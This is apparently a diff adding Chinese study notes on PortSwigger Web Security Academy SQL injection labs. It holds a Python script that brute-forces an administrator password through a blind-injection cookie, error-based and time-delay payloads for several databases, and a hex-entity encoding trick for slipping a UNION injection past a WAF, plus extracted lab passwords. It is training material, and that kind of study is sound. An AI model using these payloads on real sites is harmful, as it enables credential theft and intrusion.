@@ -338,3 +338,332 @@ Cookie: TrackingId=i6xQwpnJkSS7hUrN'%20and%20substring((select%20password%20from
 
 如果正确，页面中会返回一个Welcome back，否则不返回Welcome back
 
+写个脚本或者burpsuite爆破
+
+```python
+import requests
+import string
+import time
+
+# URL 和基本信息
+url = "https://0abc001d037474cb8057cb9f00f80046.web-security-academy.net/filter?category=Gifts"
+session_cookie = "gK5IxdwjPjRvMn9DfmlpncffvkQFLfWN"
+original_tracking_id = "3w1lnrR49rIGooyH"
+
+# 字符集（可以根据目标系统调整）
+charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
+
+# 响应判定依据：关键字 或 响应长度变化
+success_indicator = "Welcome back"  # 可根据实际情况修改（比如页面是否显示某些内容）
+
+def test_char(position, char):
+    # 构造注入 payload
+    payload = f"{original_tracking_id}' AND substring((select password from users where username='administrator'),{position},1)='{char}'--+"
+    payload_encoded = requests.utils.quote(payload)
+
+    # 设置 Cookie
+    cookies = {
+        "TrackingId": payload_encoded,
+        "session": session_cookie
+    }
+
+    # 发送请求
+    response = requests.get(url, cookies=cookies)
+
+    # 判断是否为 True
+    if success_indicator in response.text:
+        return True
+    return False
+
+def extract_password(max_length=30):
+    password = ""
+    print("开始爆破管理员密码...")
+    for position in range(1, max_length + 1):
+        found = False
+        for char in charset:
+            print(f"[*] 尝试位置 {position} 字符：{char}", end="\r")
+            if test_char(position, char):
+                password += char
+                print(f"[+] 找到第 {position} 位字符：{char}")
+                found = True
+                break
+            time.sleep(0.1)  # 减缓请求频率，避免被WAF检测
+        if not found:
+            print(f"[!] 第 {position} 位未找到，可能已到末尾，当前密码为：{password}")
+            break
+    return password
+
+# 执行
+final_password = extract_password()
+print(f"\n[*] 爆破结束，管理员密码是：{final_password}")
+
+```
+
+## 9、报错注入
+
+例子
+
+```sql
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+
+如果条件为假：'a' = 'a' 不报错
+
+如果条件为真：触发除0错误 报错
+
+### 关卡1：
+
+```
+Cookie: TrackingId=OzouoA9wVPzw8Aip'||(select+'')||'--+
+```
+
+||是字符串连接符
+
+这样做 拼接过程是`OzouoA9wVPzw8Aip + '' + ''` = `OzouoA9wVPzw8Aip ` 不会造成危害
+
+结果响应是500 推测是oracle数据库
+
+oracle不支持这种`select ''`不指定from的语句，其他常见的都是支持的
+
+
+
+改成：
+
+```
+Cookie: TrackingId=OzouoA9wVPzw8Aip'||(select+''+from+dual)||'--+
+```
+
+`dual` 是 Oracle 数据库中的一个特殊单行表，常用于计算表达式。
+
+响应是200，确定是oracle数据库
+
+
+
+```sql
+OzouoA9wVPzw8Aip'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'--+;
+报错
+```
+
+```sql
+OzouoA9wVPzw8Aip'||(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'--+;
+不报错
+```
+
+可以通过这个语句来验证是否存在administrator用户
+
+```sql
+OzouoA9wVPzw8Aip'||(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+where+username='administrator')||'--+
+状态200
+```
+
+在case then语句中*是非法的
+
+密码长度，注意报错说明是对的，不报错才说明是错的
+
+```sql
+OzouoA9wVPzw8Aip'||(SELECT CASE WHEN LENGTH(password)>5 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+密码长度是20
+
+
+
+burpsuite逐位爆破
+
+![image-20250806231716447](assets/image-20250806231716447.png)
+
+结果：vbnaj0sxaeocdfe97cv4
+
+### 关卡2
+
+```
+TrackingId=XW3erD3QG61vhT8T'+and+cast((select+1)+as+int)--+
+```
+
+报错：ERROR: argument of AND must be type boolean, not type integer
+
+调整为：
+
+```
+Cookie: TrackingId=XW3erD3QG61vhT8T'+and+1=cast((select+1)+as+int)--+
+```
+
+不报错了
+
+调整为：
+
+```
+Cookie: TrackingId=XW3erD3QG61vhT8T'+and+1=cast((select+username+from+users)+as+int)--+
+```
+
+报错信息：
+
+```
+Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'XW3erD3QG61vhT8T' and 1=cast((select username from users) as'. Expected  char
+```
+
+由于输出字符限制，信息不全
+
+删除 TrackingId Cookie 的原始值以释放一些额外的字符。重新发送请求。
+
+```
+Cookie: TrackingId='+and+1=cast((select+username+from+users)+as+int)--+
+```
+
+报错：
+
+ERROR: more than one row returned by a subquery used as an expression
+
+```
+Cookie: TrackingId='+and+1=cast((select+username+from+users+limit+1)+as+int)--+
+```
+
+报错信息：ERROR: invalid input syntax for type integer: "administrator"
+
+```
+Cookie: TrackingId='+and+1=cast((select+password+from+users+where+username='administrator')+as+int)--+
+```
+
+报错：ERROR: syntax error at end of input   **为什么不行？**
+
+答：`'administrator'` 里出现了引号，导致外层 SQL 报错了，需要对单引号进行url编码 %27
+
+```
+Cookie: TrackingId='+and+1=cast((select+password+from+users+limit+1)+as+int)--+
+```
+
+ERROR: invalid input syntax for type integer: "hkgrddp50z1iizy2rk9g"
+
+## 10、Lab: Blind SQL injection with time delays and information retrieval（延时注入）
+
+基于时间的盲注
+
+这一关和布尔盲注不一样，SQL注入不会通过页面内容直接暴露出任何“真假”信息，至于实现方法，可能是使用 `try...catch`（或对应语言的异常捕获）捕捉 SQL 错误，使错误不抛出到页面
+
+| 数据库类型     | 延迟函数          | 当前数据库名函数     |
+| -------------- | ----------------- | -------------------- |
+| **MySQL**      | `SLEEP(5)`        | `DATABASE()`         |
+| **PostgreSQL** | `pg_sleep(5)`     | `current_database()` |
+| **SQL Server** | `WAITFOR DELAY`   | `DB_NAME()`          |
+| **Oracle**     | `dbms_lock.sleep` | `SYS_CONTEXT(...)`   |
+
+怎么知道它网站用的是什么数据库？手动的话就是盲探
+
+MySQL 探测
+
+```
+' AND IF(1=1, SLEEP(5), 0) --+
+```
+
+或者：
+
+```
+' OR SLEEP(5) --+
+```
+
+SQL Server 探测
+
+```
+'; IF 1=1 WAITFOR DELAY '0:0:5'-- 
+```
+
+或者：
+
+```
+'; WAITFOR DELAY '0:0:5'-- 
+```
+
+Oracle 探测（较少用，通常需要高权限）
+
+```
+'; BEGIN dbms_lock.sleep(5); END; -- 
+```
+
+
+
+```
+Cookie: TrackingId=lDSW4FEA5hmSQ7nN'||(select+case+when+(1=1)+then+pg_sleep(7)+else+pg_sleep(0)+end)||';
+```
+
+有延时
+
+```
+Cookie: TrackingId=lDSW4FEA5hmSQ7nN'||(select+case+when+(username='administrator')+then+pg_sleep(5)+else+pg_sleep(0)+end+from+users)||'; 
+```
+
+有延时
+
+```
+Cookie: TrackingId=lDSW4FEA5hmSQ7nN'||(select+case+when+(length(password)=20)+then+pg_sleep(5)+else+pg_sleep(0)+end+from+users+where+username='administrator')||';
+```
+
+有延时 密码是20位
+
+
+
+在burpsuite的setting中： 设置为3秒
+
+![image-20250807161501692](assets/image-20250807161501692.png)
+
+![image-20250807162234705](assets/image-20250807162234705.png)
+
+## 11、带外 盲注
+
+## 12、XML编码形式的SQL注入
+
+/product/stock 这个接口存在sql注入
+
+请求体中：
+
+![image-20250807173805439](assets/image-20250807173805439.png)
+
+返回：370 units
+
+换成7+1
+
+返回：478 units
+
+
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<stockCheck>
+		<productId>
+			7 union selct null
+		</productId>
+		<storeId>
+			2
+		</storeId>
+	</stockCheck>
+```
+
+返回："Attack detected"
+
+选中`7 union selct null`，使用插件 “扩展程序”>“Hackvertor”>“编码”>“dec_entities/hex_entities”
+
+这样可以绕过WAF
+
+
+
+```xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+	<productId>
+		2
+	</productId>
+	<storeId>
+		<@hex_entities>
+			2 UNION SELECT username || '~' || password FROM users
+		</@hex_entities>
+	</storeId>
+</stockCheck>
+```
+
+carlos~2i65tzk7pxbzvl22hhhx
+287 units
+administrator~0d1ww5gegtray8ifa2qc
+wiener~az0xzy9rrkla5avaru1e
+
+productId那里似乎不能进行联查
+
